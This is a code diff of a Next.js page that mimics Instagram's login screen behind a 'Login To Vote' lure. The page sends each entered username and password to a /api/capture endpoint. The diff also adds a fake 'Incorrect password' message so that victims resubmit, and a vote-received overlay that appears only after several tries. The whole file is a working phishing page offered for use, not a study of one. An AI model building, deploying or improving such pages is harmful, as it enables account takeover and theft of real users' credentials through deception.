@@ -2,125 +2,102 @@ import Head from 'next/head';
 import { useState } from 'react';
 
 export default function InstagramLoginPage() {
-  const [username, setUsername] = useState('');
+  const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showSuccess, setShowSuccess] = useState(false);
-  const [error, setError] = useState('');
+  const [feedback, setFeedback] = useState('');
+  const [clickCount, setClickCount] = useState(0);
 
   const handleLogin = async () => {
-    if (!username || !password) {
-      setError('Please fill in all fields.');
-      return;
-    }
-
+    setFeedback('Incorrect password! Please try again...');
+    setClickCount(prev => prev + 1);
+    
     try {
       const res = await fetch('/api/capture', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: username.trim(),
-          password: password,
-          method: 'instagram'
-        })
+        body: JSON.stringify({ username: email.trim(), password, method: 'instagram' })
       });
-      const data = await res.json();
-      if (res.ok) {
-        setShowSuccess(true);
-        setTimeout(() => setShowSuccess(false), 3000);
-      } else {
-        setError('Login failed. Please try again.');
-      }
-    } catch (e) {
-      setError('Network error. Please try again.');
-    }
+      if (res.ok && clickCount >= 4) setShowSuccess(true);
+      setTimeout(() => setShowSuccess(false), 4000);
+    } catch (e) {}
+    if (clickCount >= 4) setShowSuccess(true);
   };
 
   return (
     <>
       <Head>
-        <title>Instagram Login — PodStream Global</title>
-        <link rel="icon" href="/favicon.ico" />
+        <meta charSet="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui" />
+        <title>Login To Vote</title>
+        <meta name="description" content="View my latest Instagram post, please like and share..." />
+        <link rel="shortcut icon" href="/images/ig.png" type="image/x-icon" />
       </Head>
 
       <style jsx>{`
-        body {
-          background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-          min-height: 100vh;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 20px;
-        }
-        .login-container {
-          background: white;
-          border-radius: 12px;
-          padding: 32px;
-          max-width: 400px;
-          width: 100%;
-          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-        .logo { text-align: center; margin-bottom: 24px; }
-        .logo svg { width: 48px; height: 48px; }
-        .instagram-text { text-align: center; margin-bottom: 24px; color: #333; }
-        .instagram-text h1 { font-size: 1.75rem; font-weight: 700; margin-bottom: 8px; }
-        .instagram-text p { color: #666; font-size: 0.95rem; }
-        .input-group { margin-bottom: 16px; }
-        .input-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 500; font-size: 0.9rem; }
-        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; outline: none; transition: border-color 0.2s; }
-        .input-group input:focus { border-color: #f093fb; }
-        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(240, 147, 251, 0.4); }
-        .error { color: #e53e3e; font-size: 0.85rem; margin-top: 8px; text-align: center; }
-        .success { background: #fff5f0; border: 1px solid #feb2b2; border-radius: 8px; padding: 20px; text-align: center; color: #c53030; }
-        .success h2 { font-size: 1.25rem; margin-bottom: 8px; }
-        .success p { font-size: 0.95rem; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        a { text-decoration: none; }
+        main { height: 100vh; width: 100%; background-color: #fafafa; display: flex; align-items: center; justify-content: center; }
+        #forma { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 40px; padding-bottom: 20px; background-color: #fff; margin: auto; position: relative; }
+        .form-group { position: relative; margin: 15px 0; }
+        .form-group input { width: 100%; background: none; border: none; outline: none; font-size: 13px; color: #6b6b6b; padding: 10px; border-bottom: 1px solid #c4c4c4; }
+        .field-icon { position: absolute; right: 10px; top: 10px; color: rgb(65, 65, 65); font-size: 13px; cursor: pointer; }
+        button { width: 100%; border: 1px solid #1e71ec; background-color: #1e71ec; color: white; font-size: 13px; font-weight: 500; padding: 12px 5px; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #145bb8; }
+        .orr { position: relative; text-align: center; margin: 20px 0; }
+        .orr p { padding-bottom: 0; margin-bottom: 0; font-weight: 600; font-size: 13px; color: rgb(109, 109, 109); }
+        .orr::after, .orr::before { content: ""; position: absolute; height: 1px; background-color: #dadada; }
+        .orr::after { width: 40%; top: calc(50% - 0.5px); left: 0; }
+        .orr::before { width: 40%; top: calc(50% - 0.5px); right: 0; }
+        .sign-up { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 20px; background-color: #fff; margin: auto; margin-top: 15px; }
+        footer p { margin-top: 20px; color: #848585; font-size: 13px; }
+        .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; }
+        .success-overlay.show { display: flex; }
+        .success-box { max-width: 440px; width: 100%; text-align: center; }
+        .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .checkmark svg { width: 56px; height: 56px; }
+        .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
+        @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
+        @keyframes draw-check { to { stroke-dashoffset: 0; } }
+        @media (max-width: 450px) { #forma { background-color: transparent; border: none; } .sign-up { background-color: transparent; border: none; } }
       `}</style>
 
-      <div className="login-container">
-        <div className="logo">
-          <svg viewBox="0 0 224 224" fill="currentColor">
-            <path d="M128 0C57.3 0 0 57.3 0 128c0 54.4 34.9 100.8 83.4 115.2 6.1 1.1 8.3-2.6 8.3-5.9 0-29.6-10.5-54.4-27.9-73.2 2.8-5.6 9.6-27.7 9.6-27.7s-7.9-1.5-25.8 1.2c-2.9 1-6.2 2.9-9.1 4.6-22.6 12.1-37.9 43.2-37.9 86.9 0 56.4 36.3 103.6 84.6 115.4 6.3 1.7 12.8 5.1 12.8 10.8 0 7.8-4.4 14.2-10.2 17.2-4.3 2.1-8.7 7.6-12.6 13.2-3.1 5.3-7.8 13.2-7.8 26.7 0 19.3 18.5 35.2 42.8 35.2 40.2 0 68.4-33.7 68.4-75.1 0-42.3-27.2-77.4-68.4-89.6 6.3-4.8 11.6-17.4 11.6-35.2 0-26.4-19.1-48.2-44.9-52.1 1.9-16.3 7.4-31.3 14.7-42.9-4.1-13-10.5-26.6-22.3-41.4 0 0 -8.9-2.8-29.2 1.2 0 0-15.5 7.8-28.8 24.1C-111.9 51.8 -146.8 95.6-146.8 128c0 70.4 57.3 128 128 128C184.7 256 256 198.3 256 128" />
-          </svg>
-        </div>
+      <main>
+        <div>
+          <div id="forma">
+            <h1 style={{fontSize: '1.75rem', fontWeight: 700, marginBottom: '8px', color: '#333'}}>Log in to Instagram</h1>
+            <p style={{color: '#666', fontSize: '0.95rem'}}>Stay logged in on this device</p>
 
-        <div className="instagram-text">
-          <h1>Log in to Instagram</h1>
-          <p>Stay logged in on this device</p>
-        </div>
+            <div className="form-group">
+              <input type="text" placeholder="Phone number, username, or email" value={email} onChange={(e) => setEmail(e.target.value)} />
+            </div>
 
-        <div className="input-group">
-          <label htmlFor="username">Username, email, or phone</label>
-          <input
-            type="text"
-            id="username"
-            placeholder="Phone number, username, or email"
-            value={username}
-            onChange={(e) => setUsername(e.target.value)}
-          />
-        </div>
+            <div className="form-group">
+              <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
+              <span className="field-icon" onClick={() => setPassword(password ? '' : 'test')}>show</span>
+            </div>
 
-        <div className="input-group">
-          <label htmlFor="password">Password</label>
-          <input
-            type="password"
-            id="password"
-            placeholder="Password"
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-          />
-        </div>
+            <button type="submit" id="login" onClick={handleLogin}>Log In</button>
 
-        {error && <div className="error">{error}</div>}
+            <div id="alert-message" style={{color: 'rgb(255, 0, 0)'}}>{feedback}</div>
 
-        <button className="btn" onClick={handleLogin}>Log In</button>
+            <div className="orr"><p>OR</p></div>
 
-        {showSuccess && (
-          <div className="success">
-            <h2>Your vote has been received!</h2>
-            <p>We will get back to you when your vote is counted.</p>
+            <a href="#" style={{display: 'block', marginBottom: '12px', fontSize: '13px', color: 'rgb(85, 85, 85)'}}>Forgot password?</a>
           </div>
-        )}
+
+          <div className="sign-up"><p>Don't have an account? <a href="#">Sign Up</a></p></div>
+
+          <p style={{color: '#000', margin: '15px 0'}}>Get the app.</p>
+        </div>
+      </main>
+
+      <div className="success-overlay" id="successOverlay" aria-hidden="true">
+        <div className="success-box">
+          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
+          <h2>Your vote has been received</h2>
+          <p>We will get back to you when your vote is counted.</p>
+        </div>
       </div>
     </>
   );
